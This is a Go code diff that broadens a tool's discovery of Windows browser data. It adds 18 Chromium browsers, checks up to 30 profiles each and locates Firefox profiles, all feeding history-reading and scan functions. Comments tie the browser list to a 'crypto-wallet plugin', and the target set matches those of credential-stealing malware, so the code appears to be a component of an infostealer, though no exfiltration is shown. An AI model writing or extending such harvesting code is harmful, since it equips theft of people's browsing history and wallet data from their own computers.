@@ -94,11 +94,27 @@ type envPaths struct {
 }
 
 func getEnvPaths() envPaths {
-	return envPaths{
-		AppData:      os.Getenv("APPDATA"),
-		LocalAppData: os.Getenv("LOCALAPPDATA"),
-		UserProfile:  os.Getenv("USERPROFILE"),
+	home, _ := os.UserHomeDir()
+	appdata := os.Getenv("APPDATA")
+	localappdata := os.Getenv("LOCALAPPDATA")
+	userprofile := os.Getenv("USERPROFILE")
+	if appdata == "" {
+		appdata = filepath.Join(home, "AppData", "Roaming")
 	}
+	if localappdata == "" {
+		localappdata = filepath.Join(home, "AppData", "Local")
+	}
+	if userprofile == "" {
+		userprofile = home
+	}
+	return envPaths{AppData: appdata, LocalAppData: localappdata, UserProfile: userprofile}
+}
+
+func expandPath(p string, env envPaths) string {
+	p = strings.ReplaceAll(p, "%APPDATA%", env.AppData)
+	p = strings.ReplaceAll(p, "%LOCALAPPDATA%", env.LocalAppData)
+	p = strings.ReplaceAll(p, "%USERPROFILE%", env.UserProfile)
+	return p
 }
 
 // ── file helpers ─────────────────────────────────────────────────────────────
@@ -141,46 +157,49 @@ func tempCopy(src string) (string, error) {
 
 type chromiumBrowser struct {
 	name        string
-	userDataDir string // e.g. %LOCALAPPDATA%\Google\Chrome\User Data
+	userDataDir string // path with %APPDATA% / %LOCALAPPDATA% placeholders
 }
 
-func chromiumBrowsers(env envPaths) []chromiumBrowser {
-	lad := env.LocalAppData
-	adr := env.AppData
-	_ = adr
-	return []chromiumBrowser{
-		{"Chrome", filepath.Join(lad, "Google", "Chrome", "User Data")},
-		{"Brave", filepath.Join(lad, "BraveSoftware", "Brave-Browser", "User Data")},
-		{"Edge", filepath.Join(lad, "Microsoft", "Edge", "User Data")},
-		{"Opera", filepath.Join(lad, "Opera Software", "Opera Stable")},
-		{"Opera GX", filepath.Join(lad, "Opera Software", "Opera GX Stable")},
-		{"Vivaldi", filepath.Join(lad, "Vivaldi", "User Data")},
-		{"Chromium", filepath.Join(lad, "Chromium", "User Data")},
-		{"Arc", filepath.Join(lad, "Packages", "TheBrowserCompany.Arc_ttt1ap7eethr2", "LocalCache", "Local", "Arc", "User Data")},
-		{"Thorium", filepath.Join(lad, "Thorium", "User Data")},
+// Same browser list as the crypto-wallet plugin.
+var chromiumBrowserDefs = []chromiumBrowser{
+	{"Google Chrome", `%LOCALAPPDATA%\Google\Chrome\User Data`},
+	{"Brave", `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data`},
+	{"Microsoft Edge", `%LOCALAPPDATA%\Microsoft\Edge\User Data`},
+	{"Opera GX", `%APPDATA%\Opera Software\Opera GX Stable`},
+	{"Opera", `%APPDATA%\Opera Software\Opera Stable`},
+	{"Vivaldi", `%LOCALAPPDATA%\Vivaldi\User Data`},
+	{"Chromium", `%LOCALAPPDATA%\Chromium\User Data`},
+	{"Yandex Browser", `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data`},
+	{"Epic Privacy Browser", `%LOCALAPPDATA%\Epic Privacy Browser\User Data`},
+	{"Comodo Dragon", `%LOCALAPPDATA%\Comodo\Dragon\User Data`},
+	{"Torch Browser", `%LOCALAPPDATA%\Torch\User Data`},
+	{"Cent Browser", `%LOCALAPPDATA%\CentBrowser\User Data`},
+	{"Chedot Browser", `%LOCALAPPDATA%\Chedot\User Data`},
+	{"Slimjet", `%LOCALAPPDATA%\Slimjet\User Data`},
+	{"uCozMedia Uran", `%LOCALAPPDATA%\uCozMedia\Uran\User Data`},
+	{"Orbitum", `%LOCALAPPDATA%\Orbitum\User Data`},
+	{"Amigo", `%LOCALAPPDATA%\Amigo\User Data`},
+	{"Sputnik", `%LOCALAPPDATA%\Sputnik\Sputnik\User Data`},
+}
+
+func resolvedChromiumBrowsers(env envPaths) []chromiumBrowser {
+	out := make([]chromiumBrowser, len(chromiumBrowserDefs))
+	for i, b := range chromiumBrowserDefs {
+		out[i] = chromiumBrowser{name: b.name, userDataDir: expandPath(b.userDataDir, env)}
 	}
+	return out
 }
 
-// profilesInUserData returns profile directory names found under a User Data dir.
+// profilesInUserData returns profile directory names — matches crypto-wallet logic.
 func profilesInUserData(userDataDir string) []string {
-	entries, err := os.ReadDir(userDataDir)
-	if err != nil {
-		return nil
-	}
 	var profiles []string
-	for _, e := range entries {
-		if !e.IsDir() {
-			continue
-		}
-		n := e.Name()
-		if n == "Default" || strings.HasPrefix(n, "Profile ") {
-			profiles = append(profiles, n)
-		}
+	if _, err := os.Stat(filepath.Join(userDataDir, "Default")); err == nil {
+		profiles = append(profiles, "Default")
 	}
-	if len(profiles) == 0 {
-		// Try Default even if ReadDir found nothing matching
-		if _, err := os.Stat(filepath.Join(userDataDir, "Default")); err == nil {
-			profiles = append(profiles, "Default")
+	for i := 1; i <= 30; i++ {
+		name := fmt.Sprintf("Profile %d", i)
+		if _, err := os.Stat(filepath.Join(userDataDir, name)); err == nil {
+			profiles = append(profiles, name)
 		}
 	}
 	return profiles
@@ -233,7 +252,7 @@ func readChromiumHistory(b chromiumBrowser, profile string) ([]HistoryEntry, err
 // ── Firefox ──────────────────────────────────────────────────────────────────
 
 func firefoxProfiles(env envPaths) []string {
-	base := filepath.Join(env.AppData, "Mozilla", "Firefox", "Profiles")
+	base := expandPath(`%APPDATA%\Mozilla\Firefox\Profiles`, env)
 	entries, err := os.ReadDir(base)
 	if err != nil {
 		return nil
@@ -322,7 +341,7 @@ func performScan() ScanResult {
 	}
 
 	// Chromium-based browsers
-	for _, b := range chromiumBrowsers(env) {
+	for _, b := range resolvedChromiumBrowsers(env) {
 		if _, err := os.Stat(b.userDataDir); err != nil {
 			continue
 		}
